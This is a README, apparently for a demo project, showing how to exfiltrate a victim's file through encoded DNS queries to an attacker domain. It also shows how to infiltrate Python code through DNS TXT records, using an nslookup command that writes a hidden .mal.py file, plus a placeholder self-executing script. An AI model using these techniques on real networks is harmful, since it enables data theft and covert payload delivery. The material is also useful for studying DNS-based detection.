# Showcase of DNS Exfiltration and Infiltration  
Simple showcase of how to transfer data in and out of a network through the use of DNS queries and TXT records  

# Items used  
* tshark (to capture traffic on a linux box)
* python scripts (to either send dns queries or decode queries from .pcap file)

# Transfer with DNS Queries
Have your remote DNS Server capture incoming DNS queries through the use of _tshark_.  
On the 'Victim's PC' have a .txt file ready. The text file can contains any information, but keep  
in mind that the longer the text file the longer you will have to wait for all the queries to transfer.  
When you are ready run:  
```python
python3 packety.py
```
It will prompt you for a filename, once entered it will proceed to encode the data from the file.  
Once everything is encoded it will wait for user input to start transferring the data over DNS queries.  
  
Here is the process:  
1. Asks for filename.  
2. Encodes the data from file to Base64 then Base58.  
3. Encoded data is split into sections of 9. ['5eaw531rt', '25tyhj5hj']  
4. Function Encryptor is executed. For each 'list element' it append a random letter at the front, and two random letters at the back.  
['x5eaw531rtzh', 'a25tyhj5hjui']
5. Waits for user input.  
6. Begins transmitting data through DNS queries.  
x5eaw531rtzh.badbaddoma.in  
a25tyhj5hjui.badbaddoma.in  
  
To Decode your data run -> (On DNS Server where you captured the traffic through _tshark_):
```python
python3 packetyGrabber.py
```
Asks the user for the filename of the .pcap file.  
It then proceeds to decode the data. Once finished it will display the data in the terminal.  
  
Here is the process:  
1. Asks for PCAP filename.  
2. Filters through PCAP for 'dns.qry_name' == 'badbaddoma'.  
3. Strips away the first character and the last two characters. (Because we added 'extra' encryption in previous Step.4^)
4. Decodes data from Base58 then Base64.
5. Prints decoded data in the terminal.

# Infiltrate data into a network through DNS TXT records  
On your DNS Server have a TXT record, for example  
```python
text                IN      TXT     "Test TXT record"  
```
When you do: 
```python
nslookup -type=txt text.badbaddoma.in
```
you will get "Test TXT record", keep in mind TXT record is limited to 255 characters.  
  
For this Demo I will be Infiltration the following python code:
```python
import os
with open('.mal.py', 'w') as wr:
	wr.write('while True: print("maLwAre CoDe")')
os.system(f'python3 .mal.py')
```
The code above needs to be encoded to Base64 then Base58. And then from the encoded data we will make a TXT record containing  
that encoded data.  
To get the encoded code ^ you will need to make a TXT record query to your DNS Server, it will look something like this:
# Linux  
```python
nslookup -type=txt rt1.badbaddoma.in | grep 3x | cut -d \" -f2 > .mal.py
```
It's a simple python code that when ran it will create a new file(if non-existing) and write simple code into the file.  
It then will run the file that we created.  
Here is where my last python script comes in the play.  
It's a recycled code from previous scripts that upon execution it will again asks for a filename, the filename being the file  
where we stored our encoded data from the TXT record.  
It will then decode the data(overwrites the file that has the encoded data with the python code), put itself to sleep for 3 seconds and then execute the code.
